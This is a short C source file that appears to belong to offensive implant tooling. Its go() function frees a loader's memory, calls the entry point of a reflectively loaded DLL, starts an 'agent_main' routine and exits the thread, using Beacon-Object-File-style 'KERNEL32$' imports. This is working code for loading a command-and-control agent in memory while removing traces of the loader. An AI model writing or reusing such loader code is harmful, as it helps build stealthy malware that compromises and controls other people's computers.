#include <windows.h>

WINBASEAPI VOID WINAPI KERNEL32$ExitThread(DWORD);
WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

typedef BOOL WINAPI (*DLLMAIN_FUNC)(HINSTANCE, DWORD, LPVOID);

extern void agent_main(void);

void go(char * loader, char * dllEntry, char * dllBase) {
    dbg("free.c", "PICO go() entered\nAbout to free loader");

    KERNEL32$VirtualFree(loader, 0, MEM_RELEASE);

    dbg("free.c", "Loader freed\nCalling DllMain...");

    ((DLLMAIN_FUNC)dllEntry)((HINSTANCE)dllBase, DLL_PROCESS_ATTACH, NULL);

    dbg("free.c", "DllMain returned\nCalling agent_main...");

    agent_main();

    dbg("free.c", "agent_main returned\nExiting thread");

    KERNEL32$ExitThread(0);
}
